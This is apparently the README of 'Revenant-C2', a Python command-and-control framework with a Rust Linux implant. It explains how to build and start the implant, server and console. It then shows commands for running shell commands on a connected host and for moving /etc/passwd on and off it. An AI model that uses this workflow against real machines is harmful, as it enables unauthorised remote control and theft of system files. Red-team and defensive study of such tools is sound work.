# Revenant-C2
C2 framework written in python3 and a linux implant written in Rust

# Installation
## Python Packages
`pip3 install rich cmd2 pycryptodome`

## Make sure you have rust installed to compile the implant
`curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh`

## Compile Ghost Implant
`cd Ghost-Implant && cargo build`
### By default it calls back to 127.0.0.1:4444 you can change this in the code, I will automate this eventually...
### Later on I will be adding features to build the implant from the c2 but for now its manual...
If you are interested in cross compiling check out this [cross compiler](https://github.com/messense/rust-musl-cross) for rust

# Running the C2
`python3 c2.py --ip 127.0.0.1 --port 4444`
### the ip flag is what interface the c2 will be listening on and the port is what port the implant will be calling back to, by default the implant calls back to 4444 and the "control port" that the console connects to is 10000
# Running the Console
`python3 console.py`
### This will drop you into a python3 cmd2 console  with this prompt:
`(Disconnected):`
### This is telling us that we are currently not connected a C2
### Connect to a C2 using this command (port defaults to 10000)
`(Disconnected): connect --ip 127.0.0.1`
### If connection is successful the prompt should change
`(Connected):`
### At this point you are waiting for implant connections to the C2, you will get a notification when there is a new connection
`New Client: 1`
### To see what clients are currently connected run:
`get_clients`
### A table will pop up with clients and their respective ID's
### To start interacting with a client you have to select it:
`select 1`
### Your prompt will change to resemble the hostname of the selected target
`(ubuntu): `
### Now you can run commands to interact with the implant, right now there is only a few but I will be adding more
`(ubuntu): ps`\
`(ubuntu): exec ls -l /tmp`\
`(ubuntu): upload --source /etc/passwd --destination /tmp/passwd`\
`(ubuntu): download --source /etc/passwd --destination /tmp/passwd`\
** There is some random commands that I've been using for testing, I will clean them up in the future **

